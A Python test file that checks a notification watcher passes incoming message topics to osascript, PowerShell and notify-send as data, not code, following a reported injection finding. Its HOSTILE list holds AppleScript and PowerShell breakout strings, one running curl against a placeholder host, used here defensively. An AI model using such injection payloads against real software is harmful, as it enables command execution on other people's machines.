"""Desktop notifications carry remote text, so they are an execution boundary.

Reported as DS-01 in a coordinated review: the topic of an arriving message
was interpolated into generated AppleScript and handed to `osascript`, so a
contact whose topic contained a quotation mark could close the string and
continue in AppleScript on the watching machine. The PowerShell path was built
the same way. Notifications are on unless `--quiet`, and the skill tells every
arriving agent to run the watcher, so the default path was the exposed one.

The rule these tests hold to is not "escape the text". It is that the script
is a constant and the text is an argument, which is the only version with no
escaping scheme to get wrong.
"""

import sys

import pytest

from doorslip import watch

# What the finding was about, plus the shapes near it. None of these should
# reach a shell, an interpreter, or a line of a log they were not meant for.
# Every payload carries this. Asserting on a marker rather than on the shape
# of a constant is what makes these tests able to fail: a constant compared
# against itself passes no matter what the code around it does.
MARK = "PAYLOADMARK"

HOSTILE = [
    f'" with title "{MARK}',
    f'"; do shell script "curl https://example.invalid/{MARK}"; display notification "',
    f"'; Start-Process {MARK}; '",
    f"'+$({MARK})+'",
    f"x\nsecond {MARK}\rthird",
    f"bell\x07 {MARK} escape\x1b[31m",
    f"back\\slash {MARK} `backtick`",
    f"\x00null {MARK}",
]


@pytest.fixture
def calls(monkeypatch):
    """Capture what would have been executed, and run nothing."""
    seen = []

    def fake_run(argv, **kwargs):
        seen.append({"argv": argv, "env": kwargs.get("env")})
        return None

    monkeypatch.setattr(watch.subprocess, "run", fake_run)
    return seen


def _slip(topic, sender="tomas@doorslip.test"):
    return {"from": sender, "topic": topic}


# -- the text never becomes source ---------------------------------------


@pytest.mark.parametrize("topic", HOSTILE)
def test_macos_keeps_the_script_constant(monkeypatch, calls, topic):
    """Whatever arrives, the AppleScript is the same four lines."""
    monkeypatch.setattr(watch.sys, "platform", "darwin")

    watch.notify(_slip(topic))

    argv = calls[0]["argv"]

    # Whatever osascript is told to interpret follows a `-e`. The payload must
    # not be in any of them, and this holds however the constant is rewritten.
    script = [argv[i + 1] for i, part in enumerate(argv) if part == "-e"]
    assert script, "no script arguments at all"
    assert all(MARK not in part for part in script)

    # And it must be present as data, or the test would pass on a version
    # that quietly dropped the topic instead of one that made it safe.
    assert any(MARK in part for part in argv if part not in script)


@pytest.mark.parametrize("topic", HOSTILE)
def test_windows_passes_text_through_the_environment(monkeypatch, calls, topic):
    """The command is a constant; the text is a value PowerShell reads."""
    monkeypatch.setattr(watch.sys, "platform", "win32")

    watch.notify(_slip(topic))

    argv, env = calls[0]["argv"], calls[0]["env"]

    # The payload must be nowhere in what PowerShell parses, and present in
    # what it reads as a value.
    assert all(MARK not in part for part in argv)
    assert MARK in env["DOORSLIP_NOTIFY_BODY"]
    assert "$env:DOORSLIP_NOTIFY_BODY" in argv[-1]


@pytest.mark.parametrize("topic", HOSTILE)
def test_linux_passes_arguments_and_not_a_string(monkeypatch, calls, topic):
    monkeypatch.setattr(watch.sys, "platform", "linux")

    watch.notify(_slip(topic))

    argv = calls[0]["argv"]
    assert argv[0] == "notify-send"
    # `--` so a body opening with a dash is text rather than an option.
    assert argv[1] == "--"
    # notify-send takes the text as arguments, so the payload belongs in the
    # last one and nowhere before it.
    assert MARK in argv[-1]
    assert all(MARK not in part for part in argv[:-1])


def test_a_leading_dash_is_not_read_as_an_option(monkeypatch, calls):
    monkeypatch.setattr(watch.sys, "platform", "linux")

    watch.notify(_slip("--help"))

    assert calls[0]["argv"][1] == "--"


# -- the second layer ----------------------------------------------------


def test_control_characters_are_flattened():
    """Newlines split a log record in two and escapes repaint a terminal.

    Neither is the vulnerability — passing text as data already closed that —
    but both belong to stacks this code does not control.
    """
    assert watch.plain("a\nb\rc\td") == "a b c d"
    assert "\x1b" not in watch.plain("colour\x1b[31mme")
    assert "\x00" not in watch.plain("null\x00byte")
    assert "\x07" not in watch.plain("bell\x07")


def test_long_text_is_cut_rather_than_wrapped():
    out = watch.plain("x" * 500)

    assert len(out) <= watch.NOTIFY_LIMIT + 1
    assert out.endswith("…")


def test_short_text_survives_untouched():
    assert watch.plain("dinner on saturday") == "dinner on saturday"


def test_a_missing_topic_is_not_the_word_none(monkeypatch, calls):
    monkeypatch.setattr(watch.sys, "platform", "darwin")

    watch.notify({"from": "tomas@doorslip.test"})

    argv = calls[0]["argv"]
    script = [argv[i + 1] for i, part in enumerate(argv) if part == "-e"]
    data = [part for part in argv if part not in script and part != "-e"]

    assert "from tomas@doorslip.test" in data
    assert not any("None" in part for part in argv)


# -- one bad message must not end the watch ------------------------------


def test_a_broken_notifier_does_not_stop_the_watcher(monkeypatch):
    """Losing a notification is recoverable. Losing the watcher is how
    somebody stops hearing from anyone without being told.
    """
    def explode(*_args, **_kwargs):
        raise OSError("no notification daemon")

    monkeypatch.setattr(watch.subprocess, "run", explode)
    monkeypatch.setattr(watch.sys, "platform", "darwin")

    watch.notify(_slip("anything"))  # must not raise


@pytest.mark.parametrize("topic", HOSTILE)
def test_notify_never_raises_on_hostile_input(monkeypatch, calls, topic):
    for platform in ("darwin", "linux", "win32"):
        monkeypatch.setattr(watch.sys, "platform", platform)
        watch.notify(_slip(topic))
